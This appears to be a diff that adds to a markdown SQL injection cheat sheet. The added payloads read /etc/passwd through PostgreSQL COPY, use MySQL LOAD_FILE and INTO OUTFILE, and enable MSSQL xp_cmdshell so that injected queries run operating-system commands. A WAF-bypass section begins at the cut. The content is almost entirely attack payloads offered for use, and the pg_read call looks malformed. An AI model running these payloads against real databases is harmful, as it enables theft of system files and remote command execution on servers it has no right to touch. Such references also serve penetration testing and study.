@@ -1,5 +1,47 @@
 # SQL
 
+### Reading files with postgres SQL
+
+```
+create table tmp(data text); copy tmp from '/etc/passwd'; select * from tmp;
+```
+
+```
+select pg_read("/etc/passwd");
+```
+
+
+### Reading files with MySQL
+
+```
+select @@GLOBAL.secure_file_priv;
+```
+
+```
+select * from users INTO OUTFILE 'path_we_got_from_above_query/read.txt';
+```
+
+```
+select LOAD_FILE('file_path');
+```
+
+---
+
+### RCE via MSSQL
+
+```
+'EXECUTE sp_configure 'show advanced options', 1;--
+'RECONFIGURE;--
+'EXECUTE sp_configure 'xp_cmdshell', 1;--
+'RECONFIGURE;--
+```
+
+```
+' EXECUTE xp_cmdshell 'command';--
+```
+
+---
+
 ```
 ⚪To bypass a web application firewall (WAF) in SQL 
 
